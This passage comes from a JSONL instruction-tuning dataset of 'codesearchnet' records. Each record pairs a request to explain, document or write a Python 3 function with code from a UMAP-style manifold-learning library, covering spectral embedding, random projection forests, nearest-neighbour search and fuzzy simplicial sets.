eigenvector solver\\n\"\n                \"failed. This is likely due to too small an eigengap. Consider\\n\"\n                \"adding some noise or jitter to your data.\\n\\n\"\n                \"Falling back to random initialisation!\"\n            )\n            result[component_labels == label] = (\n                random_state.uniform(\n                    low=-data_range,\n                    high=data_range,\n                    size=(component_graph.shape[0], dim),\n                )\n                + meta_embedding[label]\n            )\n\n    return result", "response": "This function is used to generate a multi - component embedding for a single connected component. This is a specialised algorithm for dealing with graphs with many connected components."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ncomputes the spectral embedding of a graph.", "response": "def spectral_layout(data, graph, dim, random_state, metric=\"euclidean\", metric_kwds={}):\n    \"\"\"Given a graph compute the spectral embedding of the graph. This is\n    simply the eigenvectors of the laplacian of the graph. Here we use the\n    normalized laplacian.\n\n    Parameters\n    ----------\n    data: array of shape (n_samples, n_features)\n        The source data\n\n    graph: sparse matrix\n        The (weighted) adjacency matrix of the graph as a sparse matrix.\n\n    dim: int\n        The dimension of the space into which to embed.\n\n    random_state: numpy RandomState or equivalent\n        A state capable being used as a numpy random state.\n\n    Returns\n    -------\n    embedding: array of shape (n_vertices, dim)\n        The spectral embedding of the graph.\n    \"\"\"\n    n_samples = graph.shape[0]\n    n_components, labels = scipy.sparse.csgraph.connected_components(graph)\n\n    if n_components > 1:\n        warn(\n            \"Embedding a total of {} separate connected components using meta-embedding (experimental)\".format(\n                n_components\n            )\n        )\n        return multi_component_layout(\n            data,\n            graph,\n            n_components,\n            labels,\n            dim,\n            random_state,\n            metric=metric,\n            metric_kwds=metric_kwds,\n        )\n\n    diag_data = np.asarray(graph.sum(axis=0))\n    # standard Laplacian\n    # D = scipy.sparse.spdiags(diag_data, 0, graph.shape[0], graph.shape[0])\n    # L = D - graph\n    # Normalized Laplacian\n    I = scipy.sparse.identity(graph.shape[0], dtype=np.float64)\n    D = scipy.sparse.spdiags(\n        1.0 / np.sqrt(diag_data), 0, graph.shape[0], graph.shape[0]\n    )\n    L = I - D * graph * D\n\n    k = dim + 1\n    num_lanczos_vectors = max(2 * k + 1, int(np.sqrt(graph.shape[0])))\n    try:\n        if L.shape[0] < 2000000:\n            eigenvalues, eigenvectors = scipy.sparse.linalg.eigsh(\n                L,\n                k,\n                which=\"SM\",\n                ncv=num_lanczos_vectors,\n                tol=1e-4,\n                v0=np.ones(L.shape[0]),\n                maxiter=graph.shape[0] * 5,\n            )\n        else:\n            eigenvalues, eigenvectors = scipy.sparse.linalg.lobpcg(\n                L,\n                random_state.normal(size=(L.shape[0], k)),\n                largest=False,\n                tol=1e-8\n            )\n        order = np.argsort(eigenvalues)[1:k]\n        return eigenvectors[:, order]\n    except scipy.sparse.linalg.ArpackError:\n        warn(\n            \"WARNING: spectral initialisation failed! The eigenvector solver\\n\"\n            \"failed. This is likely due to too small an eigengap. Consider\\n\"\n            \"adding some noise or jitter to your data.\\n\\n\"\n            \"Falling back to random initialisation!\"\n        )\n        return random_state.uniform(low=-10.0, high=10.0, size=(graph.shape[0], dim))"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef sparse_angular_random_projection_split(inds, indptr, data, indices, rng_state):\n    # Select two random points, set the hyperplane between them\n    left_index = tau_rand_int(rng_state) % indices.shape[0]\n    right_index = tau_rand_int(rng_state) % indices.shape[0]\n    right_index += left_index == right_index\n    right_index = right_index % indices.shape[0]\n    left = indices[left_index]\n    right = indices[right_index]\n\n    left_inds = inds[indptr[left] : indptr[left + 1]]\n    left_data = data[indptr[left] : indptr[left + 1]]\n    right_inds = inds[indptr[right] : indptr[right + 1]]\n    right_data = data[indptr[right] : indptr[right + 1]]\n\n    left_norm = norm(left_data)\n    right_norm = norm(right_data)\n\n    if abs(left_norm) < EPS:\n        left_norm = 1.0\n\n    if abs(right_norm) < EPS:\n        right_norm = 1.0\n\n    # Compute the normal vector to the hyperplane (the vector between\n    # the two points)\n    normalized_left_data = left_data / left_norm\n    normalized_right_data = right_data / right_norm\n    hyperplane_inds, hyperplane_data = sparse_diff(\n        left_inds, normalized_left_data, right_inds, normalized_right_data\n    )\n\n    hyperplane_norm = norm(hyperplane_data)\n    if abs(hyperplane_norm) < EPS:\n        hyperplane_norm = 1.0\n    for d in range(hyperplane_data.shape[0]):\n        hyperplane_data[d] = hyperplane_data[d] / hyperplane_norm\n\n    # For each point compute the margin (project into normal vector)\n    # If we are on lower side of the hyperplane put in one pile, otherwise\n    # put it in the other pile (if we hit hyperplane on the nose, flip a coin)\n    n_left = 0\n    n_right = 0\n    side = np.empty(indices.shape[0], np.int8)\n    for i in range(indices.shape[0]):\n        margin = 0.0\n\n        i_inds = inds[indptr[indices[i]] : indptr[indices[i] + 1]]\n        i_data = data[indptr[indices[i]] : indptr[indices[i] + 1]]\n\n        mul_inds, mul_data = sparse_mul(\n            hyperplane_inds, hyperplane_data, i_inds, i_data\n        )\n        for d in range(mul_data.shape[0]):\n            margin += mul_data[d]\n\n        if abs(margin) < EPS:\n            side[i] = tau_rand_int(rng_state) % 2\n            if side[i] == 0:\n                n_left += 1\n            else:\n                n_right += 1\n        elif margin > 0:\n            side[i] = 0\n            n_left += 1\n        else:\n            side[i] = 1\n            n_right += 1\n\n    # Now that we have the counts allocate arrays\n    indices_left = np.empty(n_left, dtype=np.int64)\n    indices_right = np.empty(n_right, dtype=np.int64)\n\n    # Populate the arrays with indices according to which side they fell on\n    n_left = 0\n    n_right = 0\n    for i in range(side.shape[0]):\n        if side[i] == 0:\n            indices_left[n_left] = indices[i]\n            n_left += 1\n        else:\n            indices_right[n_right] = indices[i]\n            n_right += 1\n\n    hyperplane = np.vstack((hyperplane_inds, hyperplane_data))\n\n    return indices_left, indices_right, hyperplane, None", "response": "Given a set of indices for data points from a csr sparse format as inds indptr and data return two arrays indices_left and indices_right."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef sparse_euclidean_random_projection_split(inds, indptr, data, indices, rng_state):\n    # Select two random points, set the hyperplane between them\n    left_index = tau_rand_int(rng_state) % indices.shape[0]\n    right_index = tau_rand_int(rng_state) % indices.shape[0]\n    right_index += left_index == right_index\n    right_index = right_index % indices.shape[0]\n    left = indices[left_index]\n    right = indices[right_index]\n\n    left_inds = inds[indptr[left] : indptr[left + 1]]\n    left_data = data[indptr[left] : indptr[left + 1]]\n    right_inds = inds[indptr[right] : indptr[right + 1]]\n    right_data = data[indptr[right] : indptr[right + 1]]\n\n    # Compute the normal vector to the hyperplane (the vector between\n    # the two points) and the offset from the origin\n    hyperplane_offset = 0.0\n    hyperplane_inds, hyperplane_data = sparse_diff(\n        left_inds, left_data, right_inds, right_data\n    )\n    offset_inds, offset_data = sparse_sum(left_inds, left_data, right_inds, right_data)\n    offset_data = offset_data / 2.0\n    offset_inds, offset_data = sparse_mul(\n        hyperplane_inds, hyperplane_data, offset_inds, offset_data\n    )\n\n    for d in range(offset_data.shape[0]):\n        hyperplane_offset -= offset_data[d]\n\n    # For each point compute the margin (project into normal vector, add offset)\n    # If we are on lower side of the hyperplane put in one pile, otherwise\n    # put it in the other pile (if we hit hyperplane on the nose, flip a coin)\n    n_left = 0\n    n_right = 0\n    side = np.empty(indices.shape[0], np.int8)\n    for i in range(indices.shape[0]):\n        margin = hyperplane_offset\n        i_inds = inds[indptr[indices[i]] : indptr[indices[i] + 1]]\n        i_data = data[indptr[indices[i]] : indptr[indices[i] + 1]]\n\n        mul_inds, mul_data = sparse_mul(\n            hyperplane_inds, hyperplane_data, i_inds, i_data\n        )\n        for d in range(mul_data.shape[0]):\n            margin += mul_data[d]\n\n        if abs(margin) < EPS:\n            side[i] = tau_rand_int(rng_state) % 2\n            if side[i] == 0:\n                n_left += 1\n            else:\n                n_right += 1\n        elif margin > 0:\n            side[i] = 0\n            n_left += 1\n        else:\n            side[i] = 1\n            n_right += 1\n\n    # Now that we have the counts allocate arrays\n    indices_left = np.empty(n_left, dtype=np.int64)\n    indices_right = np.empty(n_right, dtype=np.int64)\n\n    # Populate the arrays with indices according to which side they fell on\n    n_left = 0\n    n_right = 0\n    for i in range(side.shape[0]):\n        if side[i] == 0:\n            indices_left[n_left] = indices[i]\n            n_left += 1\n        else:\n            indices_right[n_right] = indices[i]\n            n_right += 1\n\n    hyperplane = np.vstack((hyperplane_inds, hyperplane_data))\n\n    return indices_left, indices_right, hyperplane, hyperplane_offset", "response": "This function splits a set of data points from a sparse data set and returns two arrays indices_left and indices_right."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef make_tree(data, rng_state, leaf_size=30, angular=False):\n    is_sparse = scipy.sparse.isspmatrix_csr(data)\n    indices = np.arange(data.shape[0])\n\n    # Make a tree recursively until we get below the leaf size\n    if is_sparse:\n        inds = data.indices\n        indptr = data.indptr\n        spdata = data.data\n\n        if angular:\n            return make_sparse_angular_tree(\n                inds, indptr, spdata, indices, rng_state, leaf_size\n            )\n        else:\n            return make_sparse_euclidean_tree(\n                inds, indptr, spdata, indices, rng_state, leaf_size\n            )\n    else:\n        if angular:\n            return make_angular_tree(data, indices, rng_state, leaf_size)\n        else:\n            return make_euclidean_tree(data, indices, rng_state, leaf_size)", "response": "Construct a random projection tree based on data with leaves at most leaf_size."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef num_nodes(tree):\n    if tree.is_leaf:\n        return 1\n    else:\n        return 1 + num_nodes(tree.left_child) + num_nodes(tree.right_child)", "response": "Determine the number of nodes in a tree"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ndetermining the number of leaves in a tree", "response": "def num_leaves(tree):\n    \"\"\"Determine the number of leaves in a tree\"\"\"\n    if tree.is_leaf:\n        return 1\n    else:\n        return num_leaves(tree.left_child) + num_leaves(tree.right_child)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef max_sparse_hyperplane_size(tree):\n    if tree.is_leaf:\n        return 0\n    else:\n        return max(\n            tree.hyperplane.shape[1],\n            max_sparse_hyperplane_size(tree.left_child),\n            max_sparse_hyperplane_size(tree.right_child),\n        )", "response": "Determine the maximum number of non zeros in a hyperplane entry"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nbuilding a random projection forest with n_trees.", "response": "def make_forest(data, n_neighbors, n_trees, rng_state, angular=False):\n    \"\"\"Build a random projection forest with ``n_trees``.\n\n    Parameters\n    ----------\n    data\n    n_neighbors\n    n_trees\n    rng_state\n    angular\n\n    Returns\n    -------\n    forest: list\n        A list of random projection trees.\n    \"\"\"\n    result = []\n    leaf_size = max(10, n_neighbors)\n    try:\n        result = [\n            flatten_tree(make_tree(data, rng_state, leaf_size, angular), leaf_size)\n            for i in range(n_trees)\n        ]\n    except (RuntimeError, RecursionError, SystemError):\n        warn(\n            \"Random Projection forest initialisation failed due to recursion\"\n            \"limit being reached. Something is a little strange with your \"\n            \"data, and this may take longer than normal to compute.\"\n        )\n\n    return result"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ngenerates an array of indices for each leaf of a random projection tree.", "response": "def rptree_leaf_array(rp_forest):\n    \"\"\"Generate an array of sets of candidate nearest neighbors by\n    constructing a random projection forest and taking the leaves of all the\n    trees. Any given tree has leaves that are a set of potential nearest\n    neighbors. Given enough trees the set of all such leaves gives a good\n    likelihood of getting a good set of nearest neighbors in composite. Since\n    such a random projection forest is inexpensive to compute, this can be a\n    useful means of seeding other nearest neighbor algorithms.\n    Parameters\n    ----------\n    data: array of shape (n_samples, n_features)\n        The data for which to generate nearest neighbor approximations.\n    n_neighbors: int\n        The number of nearest neighbors to attempt to approximate.\n    rng_state: array of int64, shape (3,)\n        The internal state of the rng\n    n_trees: int (optional, default 10)\n        The number of trees to build in the forest construction.\n    angular: bool (optional, default False)\n        Whether to use angular/cosine distance for random projection tree\n        construction.\n    Returns\n    -------\n    leaf_array: array of shape (n_leaves, max(10, n_neighbors))\n        Each row of leaf array is a list of indices found in a given leaf.\n        Since not all leaves are the same size the arrays are padded out with -1\n        to ensure we can return a single ndarray.\n    \"\"\"\n    if len(rp_forest) > 0:\n        leaf_array = np.vstack([tree.indices for tree in rp_forest])\n    else:\n        leaf_array = np.array([[-1]])\n\n    return leaf_array"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ncomputing a continuous version of the distance to the kth nearest neighbor. That is, this is similar to knn-distance but allows continuous k values rather than requiring an integral k. In esscence we are simply computing the distance such that the cardinality of fuzzy set we generate is k. Parameters ---------- distances: array of shape (n_samples, n_neighbors) Distances to nearest neighbors for each samples. Each row should be a sorted list of distances to a given samples nearest neighbors. k: float The number of nearest neighbors to approximate for. n_iter: int (optional, default 64) We need to binary search for the correct distance value. This is the max number of iterations to use in such a search. local_connectivity: int (optional, default 1) The local connectivity required -- i.e. the number of nearest neighbors that should be assumed to be connected at a local level. The higher this value the more connected the manifold becomes locally. In practice this should be not more than the local intrinsic dimension of the manifold. bandwidth: float (optional, default 1) The target bandwidth of the kernel, larger values will produce larger return values. Returns ------- knn_dist: array of shape (n_samples,) The distance to kth nearest neighbor, as suitably approximated. nn_dist: array of shape (n_samples,) The distance to the 1st nearest neighbor for each point.", "response": "def smooth_knn_dist(distances, k, n_iter=64, local_connectivity=1.0, bandwidth=1.0):\n    \"\"\"Compute a continuous version of the distance to the kth nearest\n    neighbor. That is, this is similar to knn-distance but allows continuous\n    k values rather than requiring an integral k. In esscence we are simply\n    computing the distance such that the cardinality of fuzzy set we generate\n    is k.\n\n    Parameters\n    ----------\n    distances: array of shape (n_samples, n_neighbors)\n        Distances to nearest neighbors for each samples. Each row should be a\n        sorted list of distances to a given samples nearest neighbors.\n\n    k: float\n        The number of nearest neighbors to approximate for.\n\n    n_iter: int (optional, default 64)\n        We need to binary search for the correct distance value. This is the\n        max number of iterations to use in such a search.\n\n    local_connectivity: int (optional, default 1)\n        The local connectivity required -- i.e. the number of nearest\n        neighbors that should be assumed to be connected at a local level.\n        The higher this value the more connected the manifold becomes\n        locally. In practice this should be not more than the local intrinsic\n        dimension of the manifold.\n\n    bandwidth: float (optional, default 1)\n        The target bandwidth of the kernel, larger values will produce\n        larger return values.\n\n    Returns\n    -------\n    knn_dist: array of shape (n_samples,)\n        The distance to kth nearest neighbor, as suitably approximated.\n\n    nn_dist: array of shape (n_samples,)\n        The distance to the 1st nearest neighbor for each point.\n    \"\"\"\n    target = np.log2(k) * bandwidth\n    rho = np.zeros(distances.shape[0])\n    result = np.zeros(distances.shape[0])\n\n    for i in range(distances.shape[0]):\n        lo = 0.0\n        hi = NPY_INFINITY\n        mid = 1.0\n\n        # TODO: This is very inefficient, but will do for now. FIXME\n        ith_distances = distances[i]\n        non_zero_dists = ith_distances[ith_distances > 0.0]\n        if non_zero_dists.shape[0] >= local_connectivity:\n            index = int(np.floor(local_connectivity))\n            interpolation = local_connectivity - index\n            if index > 0:\n                rho[i] = non_zero_dists[index - 1]\n                if interpolation > SMOOTH_K_TOLERANCE:\n                    rho[i] += interpolation * (non_zero_dists[index] - non_zero_dists[index - 1])\n            else:\n                rho[i] = interpolation * non_zero_dists[0]\n        elif non_zero_dists.shape[0] > 0:\n            rho[i] = np.max(non_zero_dists)\n\n        for n in range(n_iter):\n\n            psum = 0.0\n            for j in range(1, distances.shape[1]):\n                d = distances[i, j] - rho[i]\n                if d > 0:\n                    psum += np.exp(-(d / mid))\n                else:\n                    psum += 1.0\n\n\n            if np.fabs(psum - target) < SMOOTH_K_TOLERANCE:\n                break\n\n            if psum > target:\n                hi = mid\n                mid = (lo + hi) / 2.0\n            else:\n                lo = mid\n                if hi == NPY_INFINITY:\n                    mid *= 2\n                else:\n                    mid = (lo + hi) / 2.0\n\n        result[i] = mid\n\n        # TODO: This is very inefficient, but will do for now. FIXME\n        if rho[i] > 0.0:\n            if result[i] < MIN_K_DIST_SCALE * np.mean(ith_distances):\n                result[i] = MIN_K_DIST_SCALE * np.mean(ith_distances)\n        else:\n            if result[i] < MIN_K_DIST_SCALE * np.mean(distances):\n                result[i] = MIN_K_DIST_SCALE * np.mean(distances)\n\n    return result, rho"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef nearest_neighbors(\n    X, n_neighbors, metric, metric_kwds, angular, random_state, verbose=False\n):\n    \"\"\"Compute the ``n_neighbors`` nearest points for each data point in ``X``\n    under ``metric``. This may be exact, but more likely is approximated via\n    nearest neighbor descent.\n\n    Parameters\n    ----------\n    X: array of shape (n_samples, n_features)\n        The input data to compute the k-neighbor graph of.\n\n    n_neighbors: int\n        The number of nearest neighbors to compute for each sample in ``X``.\n\n    metric: string or callable\n        The metric to use for the computation.\n\n    metric_kwds: dict\n        Any arguments to pass to the metric computation function.\n\n    angular: bool\n        Whether to use angular rp trees in NN approximation.\n\n    random_state: np.random state\n        The random state to use for approximate NN computations.\n\n    verbose: bool\n        Whether to print status data during the computation.\n\n    Returns\n    -------\n    knn_indices: array of shape (n_samples, n_neighbors)\n        The indices on the ``n_neighbors`` closest points in the dataset.\n\n    knn_dists: array of shape (n_samples, n_neighbors)\n        The distances to the ``n_neighbors`` closest points in the dataset.\n    \"\"\"\n    if verbose:\n        print(ts(), \"Finding Nearest Neighbors\")\n\n    if metric == \"precomputed\":\n        # Note that this does not support sparse distance matrices yet ...\n        # Compute indices of n nearest neighbors\n        knn_indices = np.argsort(X)[:, :n_neighbors]\n        # Compute the nearest neighbor distances\n        #   (equivalent to np.sort(X)[:,:n_neighbors])\n        knn_dists = X[np.arange(X.shape[0])[:, None], knn_indices].copy()\n\n        rp_forest = []\n    else:\n        if callable(metric):\n            distance_func = metric\n        elif metric in dist.named_distances:\n            distance_func = dist.named_distances[metric]\n        else:\n            raise ValueError(\"Metric is neither callable, \" + \"nor a recognised string\")\n\n        if metric in (\"cosine\", \"correlation\", \"dice\", \"jaccard\"):\n            angular = True\n\n        rng_state = random_state.randint(INT32_MIN, INT32_MAX, 3).astype(np.int64)\n\n        if scipy.sparse.isspmatrix_csr(X):\n            if metric in sparse.sparse_named_distances:\n                distance_func = sparse.sparse_named_distances[metric]\n                if metric in sparse.sparse_need_n_features:\n                    metric_kwds[\"n_features\"] = X.shape[1]\n            else:\n                raise ValueError(\n                    \"Metric {} not supported for sparse \" + \"data\".format(metric)\n                )\n            metric_nn_descent = sparse.make_sparse_nn_descent(\n                distance_func, tuple(metric_kwds.values())\n            )\n\n            # TODO: Hacked values for now\n            n_trees = 5 + int(round((X.shape[0]) ** 0.5 / 20.0))\n            n_iters = max(5, int(round(np.log2(X.shape[0]))))\n            if verbose:\n                print(ts(), \"Building RP forest with\",  str(n_trees), \"trees\")\n\n            rp_forest = make_forest(X, n_neighbors, n_trees, rng_state, angular)\n            leaf_array = rptree_leaf_array(rp_forest)\n\n            if verbose:\n                print(ts(), \"NN descent for\", str(n_iters), \"iterations\")\n            knn_indices, knn_dists = metric_nn_descent(\n                X.indices,\n                X.indptr,\n                X.data,\n                X.shape[0],\n                n_neighbors,\n                rng_state,\n                max_candidates=60,\n                rp_tree_init=True,\n                leaf_array=leaf_array,\n                n_iters=n_iters,\n                verbose=verbose,\n            )\n        else:\n            metric_nn_descent = make_nn_descent(\n                distance_func, tuple(metric_kwds.values())\n            )\n            # TODO: Hacked values for now\n            n_trees = 5 + int(round((X.shape[0]) ** 0.5 / 20.0))\n            n_iters = max(5, int(round(np.log2(X.shape[0]))))\n\n            if verbose:\n                print(ts(), \"Building RP forest with\", str(n_trees), \"trees\")\n            rp_forest = make_forest(X, n_neighbors, n_trees, rng_state, angular)\n            leaf_array = rptree_leaf_array(rp_forest)\n            if verbose:\n                print(ts(), \"NN descent for\", str(n_iters), \"iterations\")\n            knn_indices, knn_dists = metric_nn_descent(\n                X,\n                n_neighbors,\n                rng_state,\n                max_candidates=60,\n                rp_tree_init=True,\n                leaf_array=leaf_array,\n                n_iters=n_iters,\n                verbose=verbose,\n            )\n\n        if np.any(knn_indices < 0):\n            warn(\n                \"Failed to correctly find n_neighbors for some samples.\"\n                \"Results may be less than ideal. Try re-running with\"\n                \"different parameters.\"\n            )\n    if verbose:\n        print(ts(), \"Finished Nearest Neighbor Search\")\n    return knn_indices, knn_dists, rp_forest", "response": "Compute the n_neighbors nearest points for each data point in X under the specified metric."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ncompute the membership strength data for the local fuzzy simplicial set.", "response": "def compute_membership_strengths(knn_indices, knn_dists, sigmas, rhos):\n    \"\"\"Construct the membership strength data for the 1-skeleton of each local\n    fuzzy simplicial set -- this is formed as a sparse matrix where each row is\n    a local fuzzy simplicial set, with a membership strength for the\n    1-simplex to each other data point.\n\n    Parameters\n    ----------\n    knn_indices: array of shape (n_samples, n_neighbors)\n        The indices on the ``n_neighbors`` closest points in the dataset.\n\n    knn_dists: array of shape (n_samples, n_neighbors)\n        The distances to the ``n_neighbors`` closest points in the dataset.\n\n    sigmas: array of shape(n_samples)\n        The normalization factor derived from the metric tensor approximation.\n\n    rhos: array of shape(n_samples)\n        The local connectivity adjustment.\n\n    Returns\n    -------\n    rows: array of shape (n_samples * n_neighbors)\n        Row data for the resulting sparse matrix (coo format)\n\n    cols: array of shape (n_samples * n_neighbors)\n        Column data for the resulting sparse matrix (coo format)\n\n    vals: array of shape (n_samples * n_neighbors)\n        Entries for the resulting sparse matrix (coo format)\n    \"\"\"\n    n_samples = knn_indices.shape[0]\n    n_neighbors = knn_indices.shape[1]\n\n    rows = np.zeros((n_samples * n_neighbors), dtype=np.int64)\n    cols = np.zeros((n_samples * n_neighbors), dtype=np.int64)\n    vals = np.zeros((n_samples * n_neighbors), dtype=np.float64)\n\n    for i in range(n_samples):\n        for j in range(n_neighbors):\n            if knn_indices[i, j] == -1:\n                continue  # We didn't get the full knn for i\n            if knn_indices[i, j] == i:\n                val = 0.0\n            elif knn_dists[i, j] - rhos[i] <= 0.0:\n                val = 1.0\n            else:\n                val = np.exp(-((knn_dists[i, j] - rhos[i]) / (sigmas[i])))\n\n            rows[i * n_neighbors + j] = i\n            cols[i * n_neighbors + j] = knn_indices[i, j]\n            vals[i * n_neighbors + j] = val\n\n    return rows, cols, vals"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef fuzzy_simplicial_set(\n    X,\n    n_neighbors,\n    random_state,\n    metric,\n    metric_kwds={},\n    knn_indices=None,\n    knn_dists=None,\n    angular=False,\n    set_op_mix_ratio=1.0,\n    local_connectivity=1.0,\n    verbose=False,\n):\n    \"\"\"Given a set of data X, a neighborhood size, and a measure of distance\n    compute the fuzzy simplicial set (here represented as a fuzzy graph in\n    the form of a sparse matrix) associated to the data. This is done by\n    locally approximating geodesic distance at each point, creating a fuzzy\n    simplicial set for each such point, and then combining all the local\n    fuzzy simplicial sets into a global one via a fuzzy union.\n\n    Parameters\n    ----------\n    X: array of shape (n_samples, n_features)\n        The data to be modelled as a fuzzy simplicial set.\n\n    n_neighbors: int\n        The number of neighbors to use to approximate geodesic distance.\n        Larger numbers induce more global estimates of the manifold that can\n        miss finer detail, while smaller values will focus on fine manifold\n        structure to the detriment of the larger picture.\n\n    random_state: numpy RandomState or equivalent\n        A state capable being used as a numpy random state.\n\n    metric: string or function (optional, default 'euclidean')\n        The metric to use to compute distances in high dimensional space.\n        If a string is passed it must match a valid predefined metric. If\n        a general metric is required a function that takes two 1d arrays and\n        returns a float can be provided. For performance purposes it is\n        required that this be a numba jit'd function. Valid string metrics\n        include:\n            * euclidean (or l2)\n            * manhattan (or l1)\n            * cityblock\n            * braycurtis\n            * canberra\n            * chebyshev\n            * correlation\n            * cosine\n            * dice\n            * hamming\n            * jaccard\n            * kulsinski\n            * mahalanobis\n            * matching\n            * minkowski\n            * rogerstanimoto\n            * russellrao\n            * seuclidean\n            * sokalmichener\n            * sokalsneath\n            * sqeuclidean\n            * yule\n            * wminkowski\n\n        Metrics that take arguments (such as minkowski, mahalanobis etc.)\n        can have arguments passed via the metric_kwds dictionary. At this\n        time care must be taken and dictionary elements must be ordered\n        appropriately; this will hopefully be fixed in the future.\n\n    metric_kwds: dict (optional, default {})\n        Arguments to pass on to the metric, such as the ``p`` value for\n        Minkowski distance.\n\n    knn_indices: array of shape (n_samples, n_neighbors) (optional)\n        If the k-nearest neighbors of each point has already been calculated\n        you can pass them in here to save computation time. This should be\n        an array with the indices of the k-nearest neighbors as a row for\n        each data point.\n\n    knn_dists: array of shape (n_samples, n_neighbors) (optional)\n        If the k-nearest neighbors of each point has already been calculated\n        you can pass them in here to save computation time. This should be\n        an array with the distances of the k-nearest neighbors as a row for\n        each data point.\n\n    angular: bool (optional, default False)\n        Whether to use angular/cosine distance for the random projection\n        forest for seeding NN-descent to determine approximate nearest\n        neighbors.\n\n    set_op_mix_ratio: float (optional, default 1.0)\n        Interpolate between (fuzzy) union and intersection as the set operation\n        used to combine local fuzzy simplicial sets to obtain a global fuzzy\n        simplicial sets. Both fuzzy set operations use the product t-norm.\n        The value of this parameter should be between 0.0 and 1.0; a value of\n        1.0 will use a pure fuzzy union, while 0.0 will use a pure fuzzy\n        intersection.\n\n    local_connectivity: int (optional, default 1)\n        The local connectivity required -- i.e. the number of nearest\n        neighbors that should be assumed to be connected at a local level.\n        The higher this value the more connected the manifold becomes\n        locally. In practice this should be not more than the local intrinsic\n        dimension of the manifold.\n\n    verbose: bool (optional, default False)\n        Whether to report information on the current progress of the algorithm.\n\n    Returns\n    -------\n    fuzzy_simplicial_set: coo_matrix\n        A fuzzy simplicial set represented as a sparse matrix. The (i,\n        j) entry of the matrix represents the membership strength of the\n        1-simplex between the ith and jth sample points.\n    \"\"\"\n    if knn_indices is None or knn_dists is None:\n        knn_indices, knn_dists, _ = nearest_neighbors(\n            X, n_neighbors, metric, metric_kwds, angular, random_state, verbose=verbose\n        )\n\n    sigmas, rhos = smooth_knn_dist(\n        knn_dists, n_neighbors, local_connectivity=local_connectivity\n    )\n\n    rows, cols, vals = compute_membership_strengths(\n        knn_indices, knn_dists, sigmas, rhos\n    )\n\n    result = scipy.sparse.coo_matrix(\n        (vals, (rows, cols)), shape=(X.shape[0], X.shape[0])\n    )\n    result.eliminate_zeros()\n\n    transpose = result.transpose()\n\n    prod_matrix = result.multiply(transpose)\n\n    result = (\n        set_op_mix_ratio * (result + transpose - prod_matrix)\n        + (1.0 - set_op_mix_ratio) * prod_matrix\n    )\n\n    result.eliminate_zeros()\n\n    return result", "response": "This function computes the fuzzy simplicial set for a set of data X."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nperforming a fast intersection of two sets of categorical labels.", "response": "def fast_intersection(rows, cols, values, target, unknown_dist=1.0, far_dist=5.0):\n    \"\"\"Under the assumption of categorical distance for the intersecting\n    simplicial set perform a fast intersection.\n\n    Parameters\n    ----------\n    rows: array\n        An array of the row of each non-zero in the sparse matrix\n        representation.\n\n    cols: array\n        An array of the column of each non-zero in the sparse matrix\n        representation.\n\n    values: array\n        An array of the value of each non-zero in the sparse matrix\n        representation.\n\n    target: array of shape (n_samples)\n        The categorical labels to use in the intersection.\n\n    unknown_dist: float (optional, default 1.0)\n        The distance an unknown label (-1) is assumed to be from any point.\n\n    far_dist float (optional, default 5.0)\n        The distance between unmatched labels.\n\n    Returns\n    -------\n    None\n    \"\"\"\n    for nz in range(rows.shape[0]):\n        i = rows[nz]\n        j = cols[nz]\n        if target[i] == -1 or target[j] == -1:\n            values[nz] *= np.exp(-unknown_dist)\n        elif target[i] != target[j]:\n            values[nz] *= np.exp(-far_dist)\n\n    return"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef reset_local_connectivity(simplicial_set):\n    simplicial_set = normalize(simplicial_set, norm=\"max\")\n    transpose = simplicial_set.transpose()\n    prod_matrix = simplicial_set.multiply(transpose)\n    simplicial_set = simplicial_set + transpose - prod_matrix\n    simplicial_set.eliminate_zeros()\n\n    return simplicial_set", "response": "Resets the local connectivity requirement for each data sample to the initial value of 1."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef categorical_simplicial_set_intersection(\n    simplicial_set, target, unknown_dist=1.0, far_dist=5.0\n):\n    \"\"\"Combine a fuzzy simplicial set with another fuzzy simplicial set\n    generated from categorical data using categorical distances. The target\n    data is assumed to be categorical label data (a vector of labels),\n    and this will update the fuzzy simplicial set to respect that label data.\n\n    TODO: optional category cardinality based weighting of distance\n\n    Parameters\n    ----------\n    simplicial_set: sparse matrix\n        The input fuzzy simplicial set.\n\n    target: array of shape (n_samples)\n        The categorical labels to use in the intersection.\n\n    unknown_dist: float (optional, default 1.0)\n        The distance an unknown label (-1) is assumed to be from any point.\n\n    far_dist float (optional, default 5.0)\n        The distance between unmatched labels.\n\n    Returns\n    -------\n    simplicial_set: sparse matrix\n        The resulting intersected fuzzy simplicial set.\n    \"\"\"\n    simplicial_set = simplicial_set.tocoo()\n\n    fast_intersection(\n        simplicial_set.row,\n        simplicial_set.col,\n        simplicial_set.data,\n        target,\n        unknown_dist,\n        far_dist,\n    )\n\n    simplicial_set.eliminate_zeros()\n\n    return reset_local_connectivity(simplicial_set)", "response": "Combine a fuzzy simplicial set with another categorical set."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef make_epochs_per_sample(weights, n_epochs):\n    result = -1.0 * np.ones(weights.shape[0], dtype=np.float64)\n    n_samples = n_epochs * (weights / weights.max())\n    result[n_samples > 0] = float(n_epochs) / n_samples[n_samples > 0]\n    return result", "response": "Generates the number of epochs per sample for each weight."}
